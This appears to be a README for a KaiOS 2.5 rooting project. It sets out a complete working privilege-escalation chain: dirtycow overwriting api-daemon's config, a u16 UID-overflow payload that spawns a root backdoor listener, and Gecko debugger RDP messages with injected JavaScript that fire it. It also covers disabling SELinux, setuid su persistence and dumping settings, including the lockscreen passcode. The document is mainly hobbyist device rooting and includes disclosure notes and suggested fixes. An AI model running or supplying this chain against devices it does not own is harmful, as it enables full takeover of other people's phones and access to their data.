# Root on KaiOS without system.img patching

A full chain from a locked-down KaiOS 2.5 shell to `uid=0` root, without
touching the system partition or flashing anything. The device stays
stock; everything lives on the persistent `/data` partition.

Tested on GHIA GQWERTY, a MediaTek MT6572 feature phone running:

```
Linux 3.4.67 #1 SMP PREEMPT ... armv7l
Android 4.4.2 base (SDK 19)
KaiOS 2.5 (ro.product.version_tag = kaios_2_5_qwerty_modric_fremium_20200623_8)
api-daemon 1.4.36
```

The kernel is a 2013-era 3.4.67, compiled post-EOL. That opens the door
to old privilege-escalation primitives. This chain uses **dirtycow**
(CVE-2016-5195) as the initial file-write primitive, then pivots through
an **integer overflow in KaiOS's api-daemon** to get root code execution.

> **Requires a PC with adb.** The trigger step needs the Gecko remote
> debugger, which is a Unix socket. KaiOS webapps cannot connect to
> Unix sockets, so an app-only approach is not possible. See
> [Why a PC is required](#why-a-pc-is-required) at the end. Once root
> is achieved, you can install a persistent `su` binary so future
> sessions don't need the PC.

---

## Table of contents

1. [Prerequisites and toolchain](#prerequisites-and-toolchain)
2. [Phase 1 - dirtycow: arbitrary file write](#2-phase-1--dirtycow-arbitrary-file-write)
3. [Phase 2 - finding the target](#phase-2--finding-the-target)
4. [Phase 3 - the integer overflow](#phase-3--the-integer-overflow)
5. [Phase 4 - weaponizing the overflow](#phase-4--weaponizing-the-overflow)
6. [Phase 5 - triggering the restart](#phase-5--triggering-the-restart)
7. [Phase 6 - the Gecko remote debugger](#phase-6--the-gecko-remote-debugger)
8. [Phase 7 - certified app + runtime token](#phase-7--certified-app--runtime-token)
9. [Phase 8 - root](#phase-8--root)
10. [Verification](#verification)
11. [Persistence](#persistence)
12. [Responsible disclosure](#responsible-disclosure)
13. [Cleanup](#cleanup)
14. [Why a PC is required](#why-a-pc-is-required)

---

## Prerequisites and toolchain

### Adb shell

You need an `adb shell` session, you can try https://w2d.js.org/ and open the developer menu.

### Device access

KaiOS ships with a stripped-down
toolset so the first step is to push a real better busybox (stolen from):

```sh
# On PC
curl -L -o busybox https://gitlab.com/suborg/omnibb/-/raw/master/rsrc/busybox.bin
adb push busybox /data/local/tmp/busybox
adb shell chmod 755 /data/local/tmp/busybox
adb shell /data/local/tmp/busybox | head -n 5
```
then, do:

```
export PATH=$PATH:/data/local/tmp
```

so busybox calls don't need ./busybox or something similar.


While FS is full of RO paths`/data/local/tmp` is a RW path `shell` can write to without root and being able to set execute permissions.

Everything we build gets pushed here.

```sh
adb shell /data/local/tmp/busybox uname -a
# Linux localhost 3.4.67 #1 SMP PREEMPT ... armv7l GNU/Linux

adb shell getprop ro.build.version.release   # 4.4.2
adb shell getprop ro.build.version.sdk       # 19
adb shell getprop ro.mediatek.platform       # MT6572
adb shell cat /proc/version
# Linux version 3.4.67 (gcc version 4.7 (GCC)) #1 SMP PREEMPT ...
```

Confirmed: Linux 3.4.67, Android 4.4 base. Towelroot (CVE-2014-3153)
was patched on 4.4, so that path is closed. dirtycow (CVE-2016-5195)
affects kernels before 4.8.3 - this one is vulnerable.

> Based on my theory, `root@gflip3_tmo:/ # uname -a Linux localhost 3.10.49-gec46d98-dirty`, on newer kernels this may not work, but not tested since i already have this device rooted (system.img patched, please someone confirm)


### Cross-compiler

A static ARMv7 toolchain is needed to build the exploit binaries. The
Android NDK's static libc aborts on this kernel (`MADV_WIPEONFORK` is
only in Linux 4.14+) and GCC is too heavy. Use musl instead:

```sh
# On PC
wget https://musl.cc/armv7l-linux-musleabihf-cross.tgz
tar xf armv7l-linux-musleabihf-cross.tgz
export PATH=$PATH:$(pwd)/armv7l-linux-musleabihf-cross/bin

# Smoke test
echo 'int main(){write(1,"hi\n",3);return 0;}' > hello.c
armv7l-linux-musleabihf-gcc -static -O2 hello.c -o helloarmv7
adb push helloarmv7 /data/local/tmp/
adb shell /data/local/tmp/helloarmv7   # hi
```

All binaries in this chain (`dirty`, `payload`, `udsclient`, `kairoot`)
are built with `armv7l-linux-musleabihf-gcc -static`.

---

## Phase 1 - dirtycow: arbitrary file write

dirtycow gives you the ability to overwrite the content of any
root-owned world-readable file, as the unprivileged `shell` user. It
does **not** give root directly: it gives you a write primitive you
then weaponize.

### Build and push

```sh
armv7l-linux-musleabihf-gcc -static -O2 -Wall -Wextra -pthread \
  -o dirty src/dirtyc0w.c
adb push dirty /data/local/tmp/dirty
adb shell chmod 755 /data/local/tmp/dirty
```

### Usage

```sh
adb shell
cd /data/local/tmp
echo "this is not a test" > foo
chmod 0404 foo                  # make it read-only for owner
echo "m00000000000000000" > foo # Permission denied
./dirty foo m00000000000000000  # ^C after a second - the threads loop
cat foo                         # m00000000000000000
```

> The exploit threads loop forever trying to win the race. **Ctrl-C it
> after a second or two** - do not wait for it to exit on its own. The
> write has already happened by then.

This proves the primitive works, but it is not root yet. We've only
shown we can modify files we don't own. The next step is to convert
arbitrary file write into root code execution.

---

## Phase 2 - finding the target

The strategy: find a root-owned daemon that reads/execs something from a path we can write to. No SUID binaries exist on this build
(`find /system -perm -4000` returns nothing), so the target must be a
daemon.

### Enumerate root processes

```sh
./busybox ash    # ash is more capable than the system sh
for d in /proc/[0-9]*; do
  p=${d##*/}
  u=$(busybox awk '/^Uid:/{print $2}' "$d/status" 2>/dev/null)
  c=$(busybox tr '\0' ' ' < "$d/cmdline" 2>/dev/null)
  [ "$u" = 0 ] && [ -n "$c" ] && echo "$p $c"
done | busybox sort -u -k2
```

Output:

```
1     /init
151   /data/local/service/api-daemon/api-daemon /data/local/service/api-daemon/config.toml
152   /data/local/service/updater/updater-daemon /data/local/service/updater/updater.toml
```

`init` is not a useful target. The other two are root daemons running
from `/data/local/service/` - a tree that's almost certainly reachable
via the dirty write primitive.

### Inspect api-daemon

```sh
ls -ld /data/local/service/api-daemon/
# drwxr-xr-x root root
ls -l /data/local/service/api-daemon/
# -rwxr-xr-x root root  3142512 api-daemon
# -rw-r--r-- root root      498 config.toml # <- world-readable, 498 bytes
# -rw------- root root       10 remote_services.toml
# drwxr-xr-x root root        remote/
cat /data/local/service/api-daemon/config.toml
```

```ini
[general]
host = "127.0.0.1"
port = 8081
message_max_time = 10
verbose_log = false
log_path = "/data/local"
remote_services_config = "/data/local/service/api-daemon/remote_services.toml"
remote_services_path = "/data/local/service/api-daemon/remote"

[http]
root_path = "/data/local/service/api-daemon/http_root"

[telemetry]
enabled = true
send_app_opened_events = true
token_uri = "https://api.kaiostech.com/v3.0/applications"
metrics_uri = "https://api.kaiostech.com/v3.0/apps/metrics"
```

Three findings:

1. **config.toml is 0644 and 498 bytes** - perfectly sized for the dirty text-write primitive. No need to write 3 MB of binary.
2. **`remote_services_path`** points at a plugin directory. If
   api-daemon execs binaries from there, redirecting that path gives
   us code execution as root.
3. The `remote/` directory already contains a third-party service
   (`wavoip2/`, owned by `u0_a1`) - confirming that the daemon
   fork/execs arbitrary ELF binaries from that path as root.

### How the loader works

From [`kaiostech/api-daemon`](https://github.com/kaiostech/api-daemon) source (`common/src/remote_services_registrar.rs`):

at startup, api-daemon walks each subdirectory of `remote_services_path`,
and for each one:

- Assigns a UID `10000 + N` to the service.
- `chown`s the subdirectory and the file named exactly `daemon` inside
  it to that UID.
- `chmod`s the directory (and parent, grandparent, great-grandparent)
  to 0755.

Then when a client requests a service by name, `spawn_child` execs
`{remote_services_path}/{name}/daemon` after calling `setuid`/`setgid`
to the service's computed UID.

## Phase 3 - the integer overflow

The UID computation has a bug. From the same source:

[`remote_services_registrar`](https://github.com/kaiostech/api-daemon/blob/a3e068fb58aaa785c10a6c72e25731ccb76ebd41/common/src/remote_services_registrar.rs#L72)

```rust
static APP_ID_BASE: u16 = 10000;

// In the TOML parser:
if let toml::Value::Integer(id) = value {
    let id = id as u16;        // <- cast from i64 to u16, no overflow check
    result.insert(name, id);
}

// In id_for():
pub fn id_for(&self, name: &str) -> Option<u16> {
    self.services.get(&name).map(|value| value + APP_ID_BASE)  // <- u16 add, wraps
}
```

And in `remote_service.rs`, the spawn path:

```rust
let uid = registrar.id_for(service);
let uid: u32 = uid.unwrap().into();
Command::new(&exec)
    .env("IPC_FD", format!("{}", child_ipc_fd))
    .env("LD_LIBRARY_PATH", format!("{}/{}", &root_path, &service))
    .pre_exec(move || {
        let _ = setgid(Gid::from_raw(uid));   // <- silently discards errors
        let _ = setuid(Uid::from_raw(uid));   // <- same
        Ok(())
    })
    .spawn()
```

### What happens with `pwn = -10000`?

| Step | Value | Type |
| --- | --- | --- |
| TOML parse | `-10000` | `i64` |
| `id as u16` | `55536` (low 16 bits of `-10000` = `0xD8F0`) | `u16` |
| Stored in `services` HashMap | `55536` | `u16` |
| `id_for("pwn")` = `55536 + 10000` | **`0`** (u16 wraparound: `65536 mod 65536 == 0`) | `u16` |
| `let uid: u32 = 0.into()` | `0` | `u32` |
| `Uid::from_raw(0)` | root | `Uid` |
| `setgid(0)` | success (no-op for root) | - |
| `setuid(0)` | success (no-op for root) | - |
| `exec` | **runs as uid 0** | - |

The `pre_exec` closure also calls `SeLinux::setcon("u:r:child-daemon:s0")`
before the setuid. On this build that call **fails silently** (the `let _ =`
pattern discards the error), so the spawned process stays in the parent's
SELinux context - `u:r:init_shell:s0`, which is more permissive than the
intended `child-daemon` domain.

A root UID inside even a moderately permissive domain can: bypass file DAC,
`chown` anything, `kill` any process, bind privileged ports, and (if
`CAP_SYS_ADMIN` is in the bounding set) remount filesystems.

## Phase 4 - weaponizing the overflow

### Build the payload

The payload is a small daemon that forks a backdoor listener on a Unix
socket. Build it with the musl toolchain:

```sh
armv7l-linux-musleabihf-gcc -static -O2 -o payload payload.c
adb push payload /data/local/tmp/payload
```

### Lay out the service directory

api-daemon expects `{remote_services_path}/{name}/daemon`. We'll point
`remote_services_path` at `/data/local/tmp/rsvc/` (shell-writable) and
name our service `pwn`:

```sh
mkdir -p /data/local/tmp/rsvc/pwn
cat > /data/local/tmp/rsvc/services.toml <<'EOF'
pwn=-10000
EOF
cp /data/local/tmp/payload /data/local/tmp/rsvc/pwn/daemon
chmod 0755 /data/local/tmp/rsvc/pwn/daemon
ls -l /data/local/tmp/rsvc/pwn/daemon
# -rwxr-xr-x shell shell ... daemon
```
### Rewrite config.toml via dirty

Write a new config that redirects `remote_services_path` to our
directory. **The replacement must be the exact same byte length** as the original (498 bytes). dirtycow overwrites in place, so a shorter string leaves trailing garbage and a longer string gets truncated. Pad with a comment if needed.

```sh
cat > /data/local/tmp/new_config.toml <<'EOF'
[general]
host = "127.0.0.1"
port = 8081
message_max_time = 10
verbose_log = false
log_path = "/data/local"
remote_services_config = "/data/local/tmp/rsvc/services.toml"
remote_services_path = "/data/local/tmp/rsvc"

[http]
root_path = "/data/local/service/api-daemon/http_root"

[telemetry]
enabled = true
send_app_opened_events = true
token_uri = "https://api.kaiostech.com/v3.0/applications"
metrics_uri = "https://api.kaiostech.com/v3.0/apps/metrics"
EOF
```

Pad to match the original's byte count

```
BASE=$(busybox wc -c < /data/local/tmp/new_config.toml)
TARGET=$(busybox wc -c < /data/local/service/api-daemon/config.toml)
PAD=$((TARGET - BASE))
if [ $PAD -gt 2 ]; then
  busybox printf '# ' >> /data/local/tmp/new_config.toml
  busybox head -c $((PAD - 3)) /dev/zero | busybox tr '\0' '#' >> /data/local/tmp/new_config.toml
  busybox printf '\n' >> /data/local/tmp/new_config.toml
fi
busybox wc -c < /data/local/tmp/new_config.toml   # must equal $TARGET
```

Write it

```
CONTENT=$(cat /data/local/tmp/new_config.toml)
./dirty /data/local/service/api-daemon/config.toml "$CONTENT"   # ^C after ~2s
```

# Verify

```
cat /data/local/service/api-daemon/config.toml
```

The config is now rewritten, but api-daemon is still running with the
old config in memory. We need it to restart and re-read the file.

## Phase 5 - triggering the restart

This was the hardest step. Everything the shell user can do to restart
a root process is blocked:

| Attempt | Result |
| --- | --- |
| `kill -9 151` | `Operation not permitted` (shell can't signal root) |
| `setprop ctl.restart api-daemon` | silently denied by SELinux |
| `stop api-daemon` / `start api-daemon` | silently denied |
| Crash via oversized HTTP / fork-bomb | api-daemon survived |

The `.rc` files that would reveal `on property:` triggers are mode 0750
root: shell can't read them.

### The answer: reboot

The key question was whether `/data` is persistent. It is:

```sh
mount | busybox grep '/data'
# /emmc@usrdata /data ext4 rw,seclabel,nosuid,nodev,noatime,discard,...
df /data
# 1.4G size, 1.2G free
```

`/data` is ext4 on the userdata partition. The rewritten `config.toml`,
the `services.toml`, and the payload binary all survive a reboot. So
`reboot` itself is the restart trigger:

```sh
reboot
```

### After reboot

```sh
adb shell
busybox ps -A | busybox grep api-daemon
#  1188 0  /data/local/service/api-daemon/api-daemon ...

cat /data/local/tmp/rsvc/services.toml
# pwn=55536  # <- api-daemon rewrote it to the canonical u16 form

ls -la /data/local/tmp/rsvc/pwn/daemon
# -rwxr-xr-x root root ... daemon  #<- chowned to root:root by the loader
```

Two proofs the overflow landed:

1. **`services.toml` was rewritten** from `pwn=-10000` to `pwn=55536`
   - api-daemon parsed the custom entry, cast it to `u16`, and wrote the
   canonical form back.
2. **The `daemon` binary is now `root:root`** - the loader's `chown`
   step ran as root and assigned it to the service's computed UID
   (which is 0 for our overflowed entry).

The overflow is confirmed working. The payload is in place and owned by
root. The only remaining task is to trigger `getService("pwn")` so
api-daemon spawns it.

---

## Phase 6 - the Gecko remote debugger

api-daemon listens on TCP port 8081 and accepts WebSocket connections
- but only from inside b2g, authenticated with a runtime token. The
token lives at `/data/local/service/api-daemon/.runtime_token` (mode
0640 root), which shell cannot read.

### The debugger socket

```sh
ls -la /data/local/debugger-socket
# srw-rw-rw- root root ... debugger-socket
```

This is b2g's Gecko remote debugger, exposed as a Unix socket at mode
**0666** - world-connectable. It speaks the [Remote Debugging Protocol
(RDP)](https://firefox-source-docs.mozilla.org/devtools/backend/protocol.html),
which is length-prefixed JSON: every message is `<length>:<json>` with
no trailing newline.

> busybox `nc` does not support `-U` (Unix sockets). Connect from the PC
> via `adb forward`:
> ```sh
> adb forward tcp:5555 localfilesystem:/data/local/debugger-socket
> nc localhost 5555
> ```
> Or use a small Python RDP client (see `gecko_debug.py`).

### The handshake

On connect, the server sends a `hello`-style root actor description:

```
748:{"from":"root","applicationType":"operating-system",...}
```

Send `listTabs` to discover the actor tree (the length prefix is
required - without it, the server silently drops the message):

```json
{"to":"root","type":"listTabs"}
```

Response:

```json
{"from":"root","selected":0,"tabs":[],
 "webappsActor":"server1.connN.webappsActor1",
 "deviceActor":"server1.connN.deviceActor2",
 "settingsActor":"server1.connN.settingsActor3"}
```

Apps on KaiOS aren't "tabs" - they're managed by `webappsActor`. The
`settingsActor` also responds to `getAllSettings` and dumps the entire
settings DB (which is how you can recover the lockscreen passcode,
debugger mode, homescreen manifest URL, etc. - useful for physical
access but not needed for this chain).

## Phase 7 - certified app + runtime token

The api-daemon WebSocket rejects connections from outside b2g (the
upgrade returns `400 Bad Request` / `Upgrade Rejection` in logcat)
because they lack the `kaios-services` subprotocol and the runtime
token. The token is only available to certified apps via
`navigator.externalapi.getToken()`.

So we need to run JavaScript **inside a running certified app's
context**. The debugger lets us do exactly that.

### Find a certified app

```json
{"to":"<webappsActor>","type":"getAll"}
```

Returns the full installed app list. Look for `appStatus: 3` (certified).
On this device, the [Store Client](https://gitlab.com/affenull2345/store-client) qualifies (Installable with Sideload, easy with https://w2d.js.org/ method):

```
app://multi.store.bananahackers.net (status=3, kind=packaged)
```

### Launch it and get an actor

```json
{"to":"<webappsActor>","type":"launch",
 "manifestURL":"app://multi.store.bananahackers.net/manifest.webapp"}
```

Wait ~8 seconds for the app to start, then:

```json
{"to":"<webappsActor>","type":"getAppActor",
 "manifestURL":"app://multi.store.bananahackers.net/manifest.webapp"}
```

Response (abbreviated):

```json
{"actor": {
   "actor": "server1.connN.child4/tab1",
   "consoleActor": "server1.connN.child4/consoleActor2",
   ...
}}
```

**Two gotchas here that cost time:**

1. **Actor extraction.** The tab actor ID is at `r["actor"]["actor"]`, not `r["actor"]`. The console actor is at `r["actor"]["consoleActor"]`.
   Using the whole dict as the `to` field silently fails.
2. **Message type.** On B2G 2.5, the console actor uses `evaluateJS` (not `evaluate`). `evaluate` returns no response at all.

Attach to the tab, then evaluate:

```json
{"to":"server1.connN.child4/tab1","type":"attach"}
{"to":"server1.connN.child4/consoleActor2","type":"evaluateJS",
 "text":"<your JS here>"}
```

### The spawn-trigger JavaScript

The JS loads the api-daemon shim (core.js + session.js, served
gzipped from `http://127.0.0.1:8081/api/v1/shared/`), opens an
authenticated WebSocket session via `navigator.externalapi.getToken()`,
and calls `getService("pwn")`:

```javascript
(function(){
  function L(u, c) {
    var s = document.createElement('script');
    s.src = u;
    s.onload = function(){ c() };
    s.onerror = function(){ c(1) };
    document.head.appendChild(s);
  }
  function S2() {
    if (typeof lib_session === 'undefined')
      L('http://127.0.0.1:8081/api/v1/shared/session.js', S3);
    else S3();
  }
  function S3() {
    if (typeof navigator.externalapi === 'undefined') return;
    var s = new lib_session.Session();
    s.open_url('ws://127.0.0.1:8081/', null, {
      onsessionconnected: function() {
        var m = KaiOS.core.CoreRequest.create({getService:{name:'pwn'}});
        var c = KaiOS.core.CoreRequest.encodeDelimited(m).finish();
        var b = KaiOS.core.BaseMessage.create({service:0, object:0, content:c});
        s.send_request(b, KaiOS.core.CoreResponse);
      },
      onsessionconnectionerror: function(){},
      onsessiondisconnected: function(){}
    }, false);
  }
  if (typeof KaiOS === 'undefined' || typeof KaiOS.core === 'undefined')
    L('http://127.0.0.1:8081/api/v1/shared/core.js', S2);
  else S2();
})()
```

Key details:

- `session.open_url` takes `null` as the token argument - the shim
  calls `navigator.externalapi.getToken()` internally.
- The WebSocket is created with subprotocol `"kaios-services"` (found
  in `session.js` source: `new WebSocket(e, "kaios-services")`). This
  is why raw `nc` upgrades returned 400.
- The callback-based form (not async/await) is used because B2G 2.5's
  `evaluateJS` does not await Promises: the JS runs and the function
  returns immediately. We don't need the return value; we just need
  the side effect (the spawn).

## Phase 8 - root

When `getService("pwn")` is processed, api-daemon calls
`spawn_child("pwn")`:

1. `id_for("pwn")` returns `55536 + 10000 = 0` (u16 wraparound)
2. `setgid(0)` / `setuid(0)` are no-ops (api-daemon is already root)
3. `setcon("u:r:child-daemon:s0")` fails silently - process stays in
   `init_shell` context
4. `exec /data/local/tmp/rsvc/pwn/daemon` - runs as uid 0

The payload forks a listener at `/data/local/tmp/rsock`. Connect to it
with the `udsclient` binary:

```sh
adb shell /data/local/tmp/udsclient /data/local/tmp/rsock
# [connected to /data/local/tmp/rsock]
id
# uid=0(root) gid=0(root) groups=1000(system),1005(audio),3003(inet)
# context=u:r:init_shell:s0
```

**Root achieved.**

## Verification

```sh
# In the rsock shell:
cat /data/local/service/api-daemon/.runtime_token
# cdba6c69-5176-4712-999f-ad55f509120f   (previously unreadable, mode 0640 root)

cat /init.rc | head -50      # previously mode 0750 root
chown root:root /data/local/tmp/test && rm /data/local/tmp/test
kill -9 151                  # kill api-daemon if you want
setenforce 0 2>/dev/null
getenforce                   # Disabled
setprop ctl.stop b2g # Stop b2g (This may be useful to launch X?)
setprop ctl.start b2g # Start b2g again
```

Full root capabilities:

- Read/write **any** file (DAC bypass - uid 0 ignores mode bits)
- `chown` anything to anything (`CAP_CHOWN`)
- Kill any process (`CAP_KILL`)
- Remount filesystems (if `CAP_SYS_ADMIN` in the bounding set)
- Disable SELinux (`setenforce 0`)
- Modify the system partition (if no dm-verity)
- Install persistent backdoors


## Persistence

The rsock listener dies on reboot, but the **infrastructure survives**:
`config.toml`, `services.toml`, and the payload binary are all on
persistent `/data`. After each reboot you just need to re-trigger the
spawn (the Multi Store + debugger approach works every time).

To make root instantly available without re-running the trigger:


### Option A - install `su` on /system?

sadly not, FS is mounted with NOSETUID, so it will not work, if any case if anyone want to test:

I bundled a minisu, `adb push minisu /data/local/tmp/` and:

```sh
mount -o rw,remount /system
cp /data/local/tmp/minisu /system/bin/su
chmod 6755 /system/bin/
chown root:root /system/bin/su
mount -o ro,remount /system
```


Now any future `adb shell` session can run `su` to get root instantly. (This fails if `/system` is read-only via dm-verity.)

### Option B - persistent init service

Use dirty to add a service entry to an `.rc` file (now readable as root) that re-runs your payload on boot (very unsafe).

### Option C - re-trigger each boot

The config + payload already survive reboot. Just re-run the debugger -> Multi Store -> evaluateJS chain after each reboot. The `kairoot.c` tool in this repo automates the trigger + shell connection in one binary.

## Responsible disclosure

This chain exploits three real vulnerabilities in KaiOS's api-daemon:

1. **Integer overflow in `RemoteServicesRegistrar::id_for()`** -
   `id as u16` cast + `id + APP_ID_BASE` addition wraps to 0, allowing
   a remote service to be assigned uid 0 (root). Affects all KaiOS 2.5+
   devices with api-daemon.
   Source: `common/src/remote_services_registrar.rs` (lines ~21-70).

2. **Silent `setuid(0)` failure** - `let _ = setuid(...)` discards the
   error. When uid=0 is computed, `setuid(0)` is a no-op from root and
   the child inherits uid 0.
   Source: `common/src/remote_service.rs` (lines ~149-168).

3. **SELinux `setcon` failure silently ignored** - the
   `SeLinux::setcon("u:r:child-daemon:s0")` call fails but execution
   continues, leaving the process in the parent's (`init_shell`)
   context instead of the intended sandboxed domain.

4. **Debugger socket world-connectable** - `/data/local/debugger-socket`
   at mode 0666 allows any local process to connect to b2g's remote
   debugger and execute JavaScript in any running certified app.

The fix is a few lines in `remote_services_registrar.rs`:

- Reject negative or out-of-range IDs at TOML parse time
- Assert that the computed uid is `>= APP_ID_BASE + 1` (never 0)
- Treat `setuid`/`setgid`/`setcon` failure as fatal (abort the spawn)
- Restrict `/data/local/debugger-socket` to mode 0660 with a restricted
  group

This should be report to **security@kaiostech.com**? in any case all existing devices (even 3.x and maybe 4.x) are vulnerable to those vulnerabilities caused by poorly-written Rust code

## Cleanup

To restore the device to its pre-exploit state:

```sh
# As root (in the rsock shell):
rm -rf /data/local/tmp/rsvc/
rm /data/local/tmp/rsock

# Restore config.toml to its original content via dirty
# (you did save the original, right?)
./dirty /data/local/service/api-daemon/config.toml "$(cat original_config.toml)"

# Remove su if you installed it
mount -o rw,remount /system
rm /system/bin/su
mount -o ro,remount /system

reboot
```

## Why a PC is required

An app-only approach (no PC) is **not possible** with this chain, for
two reasons:

1. **The debugger socket is a Unix socket.** KaiOS webapps can only
   open `ws://` (TCP) and HTTP connections - they cannot connect to
   Unix domain sockets. The Gecko debugger at
   `/data/local/debugger-socket` is only reachable via `adb forward`
   from a PC, or by a native binary running on-device.

2. **The api-daemon token is gated.** The WebSocket handshake requires
   a runtime token from `navigator.externalapi.getToken()`, which is
   only available to certified apps *inside* b2g. You can't get the
   token from a shell-level WebSocket connection - the upgrade is
   rejected (`400 Bad Request` / `Upgrade Rejection`) because the
   `kaios-services` subprotocol and token are missing. The only way
   to call `getToken()` is to run JS inside a running certified app,
   which requires the debugger, which requires the PC.

Once root is achieved, you can install a persistent `su` binary
([Option A above](#option-a--install-su-on-system)), after which
future root sessions need only `adb shell` + `su` - no PC-side trigger.

The `kairoot.c` tool in this repo collapses the trigger + shell into a
single on-device binary: connect to the debugger socket, drive the RDP
protocol to launch the Multi Store, fire the evaluateJS, then connect
to the backdoor. Run it via `adb shell /data/local/tmp/kairoot` after
each reboot.
